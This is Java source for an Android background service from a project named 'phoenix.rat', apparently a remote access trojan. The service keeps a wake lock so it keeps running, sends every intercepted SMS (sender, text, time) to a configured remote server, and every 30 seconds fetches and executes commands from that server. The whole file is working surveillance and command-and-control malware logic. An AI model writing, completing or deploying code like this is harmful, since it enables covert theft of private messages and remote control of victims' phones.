package com.phoenix.rat.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.PowerManager;
import android.widget.Toast;

import com.mjhp.eventbus.MBus;
import com.mjhp.eventbus.interfaces.RegisterBus;
import com.phoenix.rat.confs.Config;
import com.phoenix.rat.enums.ServiceState;
import com.phoenix.rat.events.SmsMessage;
import com.phoenix.rat.helper.AsyncHttp;
import com.phoenix.rat.helper.Command;
import com.phoenix.rat.helper.Scheduler;
import com.phoenix.rat.helper.TimeHelper;
import com.phoenix.rat.helper.URLHelper;
import com.phoenix.rat.interfaces.Schedulable;

import org.json.JSONArray;
import org.json.JSONObject;

import java.net.URLEncoder;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class HttpSenderService extends Service implements Schedulable{

    public static ServiceState STATE = ServiceState.NOT_RUNNING;

    public HttpSenderService() {
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }


    @Override
    public void onCreate() {
        super.onCreate();
        STATE = ServiceState.RUNNING;
        MBus.register(this);
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "TAG");
        wl.acquire();
        Scheduler.init(this, 30, TimeUnit.SECONDS);
    }


    @RegisterBus
    public void getSms(SmsMessage smsMessage){
        AsyncHttp.newInstance(
                URLHelper.fromURL(Config.SMS_SENDER)
                        .addParam("phone", smsMessage.getPhone())
                        .addParam("msg", smsMessage.getMessage())
                        .addParam("time", TimeHelper.getCurrentTime())
                        .build()
                ,
                new AsyncHttp.ResponseListener() {
                    @Override
                    public void onResponse(String res) {
                    }

                    @Override
                    public void onError() {
                    }
                }
        ).run();
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        STATE = ServiceState.NOT_RUNNING;
        MBus.unregister(this);
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }


    @Override
    public void schedule() {
        AsyncHttp.newInstance(
                URLHelper.fromURL(Config.SMS_SENDER)
                        .build()
                ,
                new AsyncHttp.ResponseListener() {
                    @Override
                    public void onResponse(String res) {
                        try {
                            JSONArray jsonArray = new JSONArray(res);
                            for (int i = 0; i < jsonArray.length(); i++){
                                JSONObject jsonObject = jsonArray.getJSONObject(i);
                                Command command = Command.fromJson(jsonObject);
                                if (command.isValid(getApplicationContext()))
                                    continue;
                                command.invoke(getApplicationContext());
                            }
                        }catch (Exception e){
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void onError() {
                    }
                }
        ).run();
    }
}
